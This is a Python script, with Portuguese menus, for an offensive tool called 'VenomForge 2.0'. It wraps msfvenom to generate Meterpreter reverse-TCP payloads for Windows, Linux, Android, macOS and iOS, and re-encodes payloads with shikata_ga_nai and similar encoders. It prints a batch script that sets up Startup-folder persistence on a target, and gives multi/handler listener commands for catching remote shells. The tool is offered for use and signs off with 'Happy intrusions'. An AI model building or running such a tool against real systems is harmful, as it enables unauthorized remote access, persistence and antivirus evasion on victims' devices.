#!/usr/bin/env python3
# VenomForge 2.0 - Gerador Avançado de Payloads
# Autor: Therac-25 

import os
import sys
import subprocess
from time import sleep
import hashlib

try:
    from prettytable import PrettyTable
except ImportError:
    print("O módulo 'prettytable' não está instalado. Execute: pip install prettytable")
    sys.exit(1)

class colors:
    RED = '\033[38;5;196m'
    ORANGE = '\033[38;5;208m'
    YELLOW = '\033[38;5;226m'
    GREEN = '\033[38;5;46m'
    BLUE = '\033[38;5;45m'
    PURPLE = '\033[38;5;129m'
    PINK = '\033[38;5;201m'
    WHITE = '\033[38;5;255m'
    RESET = '\033[0m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    print(colors.PURPLE + r"""
                         __    _
                    _wr""        "-q__
                 _dP                 9m_
               _#P                     9#_
              d#@                       9#m
             d##                         ###
            J###                         ###L
            {###K                       J###K
            ]####K      ___aaa___      J####F
        __gmM######_  w#P""   ""9#m  _d#####Mmw__
     _g##############mZ_         __g##############m_
   _d####M@PPPP@@M#######Mmp gm#########@@PPP9@M####m_
  a###""          ,Z"#####@" '######"\g          ""M##m
 J#@"             0L  "*##     ##@"  J#              *#K
 #"               `#    "_gmwgm_~    dF               `#_
7F                 "#_   ]#####F   _dK                 JE
]                    *m__ ##### __g@"                   F
                       "PJ#####LP"
 `                       0######_                      '
                       _0########_
     .               _d#####^#####m__              ,
      "*w_________am#####P"   ~9#####mw_________w*"
          ""9@#####@M""           ""P@#####@M""
""" + colors.RESET)
    print(f"{colors.YELLOW}          VenomForge 2.0 - Gerador Avançado de Payloads{colors.RESET}")
    print(f"{colors.BLUE}          ---------------------------------------------{colors.RESET}\n")

def type_effect(text, color=colors.WHITE, delay=0.05):
    for char in text:
        print(color + char, end='', flush=True)
        sleep(delay)
    print(colors.RESET)

def check_dependencies():
    required = ['msfvenom', 'nmap']
    missing = []
    cmd = 'where' if os.name == 'nt' else 'which'
    for tool in required:
        if not os.popen(f"{cmd} {tool}").read().strip():
            missing.append(tool)
    if missing:
        print(f"{colors.RED}Dependências ausentes:{colors.RESET}")
        for tool in missing:
            print(f"- {tool}")
        return False
    return True

def show_network_interfaces():
    table = PrettyTable()
    table.field_names = [f"{colors.GREEN}Interface{colors.RESET}",
                         f"{colors.BLUE}Endereço IP{colors.RESET}",
                         f"{colors.PURPLE}Status{colors.RESET}"]
    table.add_row(["eth0", "192.168.1.100", "Ativa"])
    table.add_row(["wlan0", "10.0.0.15", "Ativa"])
    table.add_row(["tun0", "172.16.0.1", "Ativa"])

    print(f"\n{colors.YELLOW}Interfaces de rede disponíveis:{colors.RESET}")
    print(table)

def hash_file_menu():
    clear_screen()
    show_banner()
    print(f"{colors.PURPLE}>>> VERIFICADOR DE HASH DE ARQUIVO <<<{colors.RESET}")
    file_path = input("Digite o caminho do arquivo para verificar o hash: ").strip()
    if not os.path.isfile(file_path):
        print(f"{colors.RED}Arquivo não encontrado!{colors.RESET}")
        sleep(1)
        return
    print(f"\n{colors.YELLOW}MD5: {get_hash(file_path, 'md5')}{colors.RESET}")
    print(f"{colors.YELLOW}SHA1: {get_hash(file_path, 'sha1')}{colors.RESET}")
    print(f"{colors.YELLOW}SHA256: {get_hash(file_path, 'sha256')}{colors.RESET}")
    input(f"\n{colors.BLUE}Pressione Enter para voltar...{colors.RESET}")

def get_hash(file_path, hash_type):
    h = hashlib.new(hash_type)
    with open(file_path, 'rb') as file:
        while True:
            chunk = file.read(4096)
            if not chunk:
                break
            h.update(chunk)
    return h.hexdigest()

def encoder_menu():
    clear_screen()
    show_banner()
    print(f"{colors.PURPLE}>>> ENCODER DE PAYLOAD <<<{colors.RESET}")
    file_path = input("Digite o caminho do payload para encodar: ").strip()
    if not os.path.isfile(file_path):
        print(f"{colors.RED}Arquivo não encontrado!{colors.RESET}")
        sleep(1)
        return
    print("Escolha um encoder:")
    encoders = {
        1: "x86/shikata_ga_nai",
        2: "x86/countdown",
        3: "x86/jmp_call_additive",
        4: "Nenhum (voltar)"
    }
    for k, v in encoders.items():
        print(f"[{k}] {v}")
    try:
        choice = int(input("Encoder: "))
        if choice == 4:
            return
        encoder = encoders.get(choice)
        if not encoder:
            print(f"{colors.RED}Opção inválida!{colors.RESET}")
            sleep(1)
            return
        out_file = input("Nome para o novo arquivo encodado (ex: encoded_payload.exe): ").strip()
        if not out_file:
            out_file = "encoded_" + os.path.basename(file_path)
        cmd = [
            "msfvenom", "-e", encoder, "-i", "3", "-f", "exe", "-o", out_file, "-x", file_path
        ]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                print(f"{colors.YELLOW}\nPayload encodado salvo em: {out_file}{colors.RESET}")
            else:
                print(f"{colors.RED}\nErro ao encodar!{colors.RESET}")
                print(result.stderr)
        except Exception as e:
            print(f"{colors.RED}Falha ao executar msfvenom: {e}{colors.RESET}")
        input(f"\n{colors.BLUE}Pressione Enter para continuar...{colors.RESET}")
    except ValueError:
        print(f"{colors.RED}Por favor, digite um número!{colors.RESET}")
        sleep(1)

def persistence_menu():
    clear_screen()
    show_banner()
    print(f"{colors.PURPLE}>>> SCRIPT BÁSICO DE PERSISTÊNCIA <<<{colors.RESET}")
    print(f"{colors.YELLOW}Este é um exemplo simples para Windows (bat):{colors.RESET}\n")
    print(r"""
@echo off
copy %~f0 "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\venom.bat"
""")
    print("\nColoque o payload no mesmo local do script (.bat) e execute no alvo.")
    input(f"\n{colors.BLUE}Pressione Enter para voltar...{colors.RESET}")

def generate_payload(target):
    clear_screen()
    show_banner()
    print(f"{colors.PURPLE}>>> GERAÇÃO DE PAYLOAD - {target.upper()} <<<{colors.RESET}\n")

    payload_types = {
        "Windows": {
            "payload": "windows/meterpreter/reverse_tcp",
            "ext": "exe",
            "desc": "Meterpreter Reverse TCP para Windows"
        },
        "Linux": {
            "payload": "linux/x64/meterpreter/reverse_tcp",
            "ext": "elf",
            "desc": "Meterpreter Reverse TCP para Linux"
        },
        "Android": {
            "payload": "android/meterpreter/reverse_tcp",
            "ext": "apk",
            "desc": "Meterpreter Reverse TCP para Android"
        },
        "MacOS": {
            "payload": "osx/x64/meterpreter_reverse_tcp",
            "ext": "macho",
            "desc": "Meterpreter Reverse TCP para MacOS"
        },
        "iOS": {
            "payload": "apple_ios/aarch64/meterpreter_reverse_tcp",
            "ext": "bin",
            "desc": "Meterpreter Reverse TCP para iOS"
        }
    }

    if target not in payload_types:
        print(f"{colors.RED}Payload não implementado para este alvo.{colors.RESET}")
        sleep(2)
        return

    lhost = input(f"{colors.YELLOW}Informe o LHOST (IP para receber a conexão): {colors.RESET}").strip()
    lport = input(f"{colors.YELLOW}Informe o LPORT (porta de escuta): {colors.RESET}").strip()
    out_file = input(f"{colors.YELLOW}Nome para o arquivo do payload (padrão: venom.{payload_types[target]['ext']}): {colors.RESET}").strip()
    if not out_file:
        out_file = f"venom.{payload_types[target]['ext']}"

    print(f"\n{colors.GREEN}Gerando payload {payload_types[target]['desc']}...{colors.RESET}")
    msfvenom_cmd = [
        "msfvenom",
        "-p", payload_types[target]["payload"],
        "LHOST=" + lhost,
        "LPORT=" + lport,
        "-o", out_file
    ]

    try:
        result = subprocess.run(msfvenom_cmd, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"{colors.YELLOW}\nPayload gerado com sucesso: {out_file}{colors.RESET}")
            print(f"{colors.GREEN}\nComando para usar no msfconsole:{colors.RESET}")
            print(f"{colors.BLUE}use exploit/multi/handler")
            print(f"set PAYLOAD {payload_types[target]['payload']}")
            print(f"set LHOST {lhost}")
            print(f"set LPORT {lport}")
            print("run" + colors.RESET)
            print(f"\n{colors.YELLOW}Comando completo para colar:{colors.RESET}")
            print(f"msfconsole -x 'use exploit/multi/handler; set PAYLOAD {payload_types[target]['payload']}; set LHOST {lhost}; set LPORT {lport}; run'")
        else:
            print(f"{colors.RED}\nErro ao gerar o payload!{colors.RESET}")
            print(result.stderr)
    except Exception as e:
        print(f"{colors.RED}Falha ao executar o msfvenom: {e}{colors.RESET}")
    input(f"\n{colors.BLUE}Pressione Enter para continuar...{colors.RESET}")

def listener_menu():
    clear_screen()
    show_banner()
    print(f"\n{colors.PURPLE}>>> MENU DE ESCUTA <<<{colors.RESET}")
    print(f"{colors.YELLOW}Você pode criar o comando e copiar para o msfconsole:{colors.RESET}")
    payload = input("PAYLOAD (ex: windows/meterpreter/reverse_tcp): ").strip()
    lhost = input("LHOST (IP): ").strip()
    lport = input("LPORT (porta): ").strip()
    print(f"\n{colors.GREEN}Comando para colar:{colors.RESET}")
    print(f"{colors.BLUE}use exploit/multi/handler")
    print(f"set PAYLOAD {payload}")
    print(f"set LHOST {lhost}")
    print(f"set LPORT {lport}")
    print("run" + colors.RESET)
    print(f"\n{colors.YELLOW}Comando completo para colar:{colors.RESET}")
    print(f"msfconsole -x 'use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; run'")
    input(f"\n{colors.BLUE}Pressione Enter para voltar...{colors.RESET}")

def utilities_menu():
    while True:
        clear_screen()
        show_banner()
        print(f"\n{colors.PURPLE}>>> UTILITÁRIOS DE PAYLOAD <<<{colors.RESET}")
        print(f"{colors.GREEN}[1] Encoder de Payload")
        print(f"{colors.GREEN}[2] Verificador de Hash")
        print(f"{colors.GREEN}[3] Script de Persistência")
        print(f"{colors.RED}[4] Voltar ao Menu Principal{colors.RESET}")
        try:
            choice = int(input("\nSelecione uma opção: "))
            if choice == 1:
                encoder_menu()
            elif choice == 2:
                hash_file_menu()
            elif choice == 3:
                persistence_menu()
            elif choice == 4:
                return
            else:
                print(f"{colors.RED}Opção inválida!{colors.RESET}")
                sleep(1)
        except ValueError:
            print(f"{colors.RED}Por favor, digite um número!{colors.RESET}")
            sleep(1)

def session_menu():
    clear_screen()
    show_banner()
    print(f"\n{colors.PURPLE}>>> GERENCIAMENTO DE SESSÕES <<<{colors.RESET}")
    print(f"{colors.YELLOW}Listando sessões ativas do Metasploit (necessário msfconsole rodando)...{colors.RESET}")
    try:
        result = subprocess.run(["msfconsole", "-x", "sessions -l; exit"], capture_output=True, text=True)
        print(result.stdout)
    except Exception as e:
        print(f"{colors.RED}Erro ao executar msfconsole: {e}{colors.RESET}")
    input(f"\n{colors.BLUE}Pressione Enter para voltar...{colors.RESET}")

def payload_menu():
    while True:
        clear_screen()
        show_banner()
        print(f"{colors.PURPLE}\n>>> MENU DE GERAÇÃO DE PAYLOAD <<<{colors.RESET}")

        targets = {
            1: "Windows",
            2: "Linux",
            3: "Android",
            4: "MacOS",
            5: "iOS",
            99: "Voltar ao Menu Principal"
        }

        for key, value in targets.items():
            if key == 99:
                print(f"{colors.RED}[{key}] {value}{colors.RESET}")
            else:
                print(f"{colors.GREEN}[{key}] {colors.BLUE}{value}{colors.RESET}")

        try:
            target = int(input(f"\n{colors.YELLOW}Selecione o sistema operacional alvo: {colors.RESET}"))
            if target in targets:
                if target == 99:
                    return
                else:
                    generate_payload(targets[target])
            else:
                print(f"{colors.RED}Opção inválida!{colors.RESET}")
                sleep(1)
        except ValueError:
            print(f"{colors.RED}Por favor, digite um número!{colors.RESET}")
            sleep(1)

def main_menu():
    while True:
        clear_screen()
        show_banner()
        print(f"""{colors.ORANGE}
[1] {colors.GREEN}Gerar Payload{colors.ORANGE}
[2] {colors.GREEN}Iniciar Listener{colors.ORANGE}
[3] {colors.GREEN}Utilitários de Payload{colors.ORANGE}
[4] {colors.GREEN}Gerenciamento de Sessões{colors.ORANGE}
[5] {colors.RED}Sair{colors.RESET}""")

        try:
            choice = int(input(f"\n{colors.BLUE}Selecione uma opção: {colors.RESET}"))
            if choice == 1:
                payload_menu()
            elif choice == 2:
                listener_menu()
            elif choice == 3:
                utilities_menu()
            elif choice == 4:
                session_menu()
            elif choice == 5:
                print(f"\n{colors.YELLOW}Até logo! Boas invasões!{colors.RESET}\n")
                sys.exit(0)
            else:
                print(f"{colors.RED}\nOpção inválida! Tente novamente.{colors.RESET}")
                sleep(1)
        except ValueError:
            print(f"{colors.RED}\nPor favor, digite um número válido!{colors.RESET}")
            sleep(1)

if __name__ == "__main__":
    try:
        if not check_dependencies():
            print(f"\n{colors.RED}Algumas ferramentas necessárias estão ausentes. Instale-as primeiro.{colors.RESET}")
            sys.exit(1)

        clear_screen()
        type_effect("Inicializando VenomForge 2.0...", colors.PURPLE)
        sleep(1)
        main_menu()

    except KeyboardInterrupt:
        print(f"\n{colors.RED}Interrompido pelo usuário. Saindo...{colors.RESET}")
        sys.exit(0)
